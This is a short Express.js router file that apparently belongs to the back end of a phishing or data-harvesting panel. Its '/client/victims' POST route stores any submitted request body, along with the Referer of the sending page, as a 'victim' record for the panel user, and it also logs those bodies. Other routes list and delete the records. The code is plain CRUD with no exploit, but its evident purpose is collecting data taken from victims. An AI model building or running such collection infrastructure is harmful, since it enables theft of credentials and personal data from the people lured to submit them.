const router = require("express").Router();
const VictimController = require("../../../database/controllers/VictimController");
const victim = new VictimController();
const AuthController = require("../../../database/controllers/AuthController");
const status = require("../../../functions/status");

router
    .route("/client/victims")
    .post(async (req, res) => {
        const body = req.body;
        const url = req.get("Referer") || req.headers.referer || "";
        console.log({
            url,
            body,
        });
        try {
            const result = await victim.Create(req._username, body, url);
            res.json(result);
        } catch (e) {
            console.log(e);
            return res.json(status.server_error);
        }
    })
    .get(async (req, res) => {
        console.log("/client/victims");
        try {
            const result = await victim.GetAll(req._username);
            res.json(result);
            console.log("victims", result);
        } catch {
            console.log("500");
            return res.json(status.server_error);
        }
    });

router.delete("/client/victims/:id", async (req, res) => {
    const { id } = req.params;

    if (!id) return res.json(status.server_error);

    try {
        const result = await victim.Delete(id);
        return res.json(result);
    } catch {
        return res.json(status.server_error);
    }
});

module.exports = router;
